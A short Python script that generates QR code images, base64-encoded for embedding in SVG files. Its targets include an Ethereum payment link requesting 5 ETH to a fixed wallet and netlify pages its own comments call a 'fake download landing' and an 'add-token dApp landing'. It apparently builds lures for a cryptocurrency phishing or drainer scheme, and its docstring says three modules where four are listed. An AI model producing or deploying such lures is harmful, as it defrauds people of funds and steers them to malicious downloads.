#!/usr/bin/env python3
"""Generate QR PNGs for the three hybrid.svg modules and print their base64."""
import qrcode, base64, io
from qrcode.constants import ERROR_CORRECT_H

TARGETS = [
    ("qr1.png", "ethereum:0xBBA62B9ddd2242A3836e9bE2515c55528115152c?value=5000000000000000000"),  # EIP-681 direct 5 ETH transfer
    ("qr2.png", "https://stunning-flan-8e93f7.netlify.app"),  # add-token dApp landing
    ("qr3.png", "https://strong-semolina-e8ec11.netlify.app"),  # website redirect
    ("qr4.png", "https://playful-selkie-b0bde0.netlify.app/"),  # fake download landing
]

for filename, data in TARGETS:
    q = qrcode.QRCode(
        version=None,
        error_correction=ERROR_CORRECT_H,   # H = ~30% redundancy, safe under a centre logo
        box_size=10,
        border=2,
    )
    q.add_data(data)
    q.make(fit=True)
    img = q.make_image(fill_color="black", back_color="white")
    img.save(filename)
    with open(filename, "rb") as f:
        b64 = base64.b64encode(f.read()).decode()
    with open(filename.replace(".png", ".b64"), "w") as f:
        f.write(b64)
    print(f"{filename}: encoded {len(data)} chars, PNG {img.size}, b64 {len(b64)} bytes")
